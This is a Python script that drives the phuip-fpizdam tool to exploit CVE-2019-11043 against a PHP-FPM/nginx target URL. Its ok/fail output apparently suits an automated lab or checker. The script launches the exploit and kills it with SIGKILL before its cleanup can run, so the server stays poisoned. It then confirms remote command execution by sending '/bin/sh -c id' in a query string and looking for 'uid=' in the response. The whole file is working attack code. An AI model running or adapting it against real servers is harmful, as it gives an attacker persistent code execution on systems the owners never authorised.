#!/usr/bin/env python3
"""CVE-2019-11043: tight-polling log, kill attacker before cleanup runs."""
import subprocess, sys, os, signal, time, urllib.request

if len(sys.argv) < 2:
    print("fail", end="", flush=True)
    sys.exit(0)

target_url = sys.argv[1]
base = target_url.rsplit("/", 1)[0]
# Force IPv4 in probe (nginx only listens on 127.0.0.1)
probe_url = base.replace("localhost", "127.0.0.1") + "/index.php?a=/bin/sh+-c+'id'&"
GO_BIN = os.path.expanduser("~/go/bin/phuip-fpizdam")
LOG = "/tmp/phuip_fpizdam.log"
PID_FILE = "/tmp/phuip_fpizdam.pid"

def probe():
    try:
        with urllib.request.urlopen(probe_url, timeout=0.3) as r:
            return b"uid=" in r.read()
    except:
        return False

def is_running():
    try:
        with open(PID_FILE) as f:
            os.kill(int(f.read().strip()), 0)
            return True
    except:
        return False

def kill_and_remove():
    try:
        with open(PID_FILE) as f:
            pid = int(f.read().strip())
        os.killpg(os.getpgid(pid), signal.SIGKILL)
    except: pass
    try: os.remove(PID_FILE)
    except: pass

# Fast path: already poisoned
if probe():
    print("ok", end="", flush=True)
    sys.exit(0)

# Spawn phuip-fpizdam (persists across attempts)
log_start = 0
if not is_running():
    try: os.remove(PID_FILE)
    except: pass
    try: log_start = os.path.getsize(LOG)
    except: pass
    with open(LOG, "a") as logf:
        proc = subprocess.Popen(
            [GO_BIN, target_url],
            stdout=logf, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
            start_new_session=True,
        )
    with open(PID_FILE, "w") as f:
        f.write(str(proc.pid))

# Tight poll: check log every 20ms for "Success!"
deadline = time.time() + 60
while time.time() < deadline:
    time.sleep(0.02)
    # Check log
    try:
        with open(LOG) as f:
            f.seek(log_start)
            if "Success!" in f.read():
                kill_and_remove()  # ← SIGKILL BEFORE cleanup completes
                time.sleep(0.1)
                # Probe 20x (1s) — round-robin may need multiple tries
                for _ in range(20):
                    if probe():
                        print("ok", end="", flush=True)
                        sys.exit(0)
                    time.sleep(0.05)
                print("fail", end="", flush=True)
                sys.exit(0)
    except FileNotFoundError:
        pass
    # Process died without our kill
    if not is_running():
        time.sleep(0.1)
        try:
            with open(LOG) as f:
                f.seek(log_start)
                if "Success!" in f.read():
                    for _ in range(20):
                        if probe():
                            print("ok", end="", flush=True)
                            sys.exit(0)
                        time.sleep(0.05)
        except: pass
        try: os.remove(PID_FILE)
        except: pass
        print("fail", end="", flush=True)
        sys.exit(0)

kill_and_remove()
print("fail", end="", flush=True)
sys.exit(0)
